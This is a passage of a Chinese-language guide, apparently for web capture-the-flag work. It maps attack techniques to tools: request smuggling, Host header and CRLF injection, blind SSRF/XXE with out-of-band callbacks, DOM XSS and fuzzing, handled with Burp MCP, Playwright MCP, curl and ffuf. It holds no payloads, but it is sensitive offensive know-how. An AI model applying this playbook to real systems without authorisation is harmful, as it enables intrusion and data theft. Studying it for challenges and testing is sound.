|-----------|-----|
| CL.TE/TE.CL 走私、obs-fold/重复 header、chunk 游戏 | Burp MCP（`send_http1_request`） |
| Host header 注入 / vhost 爆破（socket ≠ `Host:`） | Burp MCP（目标三元组） |
| H2.CL/H2.TE 走私、伪头或 header 值内 CRLF 注入 | Burp MCP（`send_http2_request`） |
| 需要回调监听器的盲打/OOB 漏洞（SSRF、XXE、DNS 外带） | Burp MCP Collaborator（**仅 Pro**） |
| 从已捕获流量中挖掘 token/端点 | Burp MCP（代理历史正则） |
| **裸 LF / 孤立 CR 的 header 失步** | 原始 socket / `pwntools` —— 会被 MCP 规范化掉 |
| **重复或大写的 HTTP/2 header** | 原始 H2 客户端 —— map 无法表达 |
| 漏洞需要 JavaScript 执行（DOM XSS、SPA、客户端加密） | Playwright MCP |
| 模拟 admin bot / 受害者浏览器 | Playwright MCP |
| 字典模糊测试、爆破、高请求量 | `ffuf` / `requests` —— **不是** `send_to_intruder` |
| 快速一次性请求、脚本化、紧凑的 CI 循环 | `curl` / `requests` |

**关键要点：** Burp MCP 负责*线路*（header 级控制、OOB 回调、已捕获流量），
Playwright MCP 负责*浏览器*（JS 执行、受害者模拟），
而 `curl`/`requests`/`ffuf` 仍是快速一次性请求、脚本化循环和大规模请求的最佳选择。
记住两条硬边界：Burp MCP 会规范化请求**前导**中的 CR/LF，
而且它无法*运行* Intruder 或启动扫描 —— 这些场景分别改用原始 socket 和 `ffuf`。
多数多阶段 Web 挑战会同时用两个服务器：用 `--proxy-server` 经 Burp 浏览，
从历史里挖掘 API 面，然后逐字节攻击那些端点。
